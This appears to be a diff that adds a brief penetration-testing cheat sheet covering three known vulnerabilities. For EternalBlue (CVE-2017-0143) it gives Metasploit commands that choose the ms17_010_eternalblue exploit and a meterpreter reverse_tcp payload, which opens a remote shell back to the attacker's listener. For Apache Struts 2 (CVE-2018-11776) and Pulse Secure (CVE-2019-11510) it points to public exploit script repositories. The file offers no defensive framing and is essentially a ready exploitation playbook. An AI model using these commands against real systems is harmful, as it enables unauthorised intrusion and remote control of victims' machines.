@@ -1,0 +1,25 @@
+--------------------------------------------
+CVE-2017-0143 - SMBv1
+--------------------------------------------
+ > metasploit
+ > https://www.cvedetails.com/cve/CVE-2017-0143/
+ > https://vulmon.com/vulnerabilitydetails?qid=CVE-2017-0143
+===================================================================
+ $ use exploit/windows/smb/ms17_010_eternalblue
+ $ set payload windows/x64/meterpreter/reverse_tcp
+ $ set rhosts <dest_ip>
+ $ set lhosts <src_ip>
+ $ set lport <src_port>
+===================================================================
+
+--------------------------------------------
+CVE-2018-11776 - Apache Struts 2
+--------------------------------------------
+ > python script
+ > https://github.com/mazen160/struts-pwn_CVE-2018-11776
+
+--------------------------------------------
+CVE-2019-11510 - (Pulse Secure)
+--------------------------------------------
+ > shell script
+ > https://github.com/projectzeroindia/CVE-2019-11510
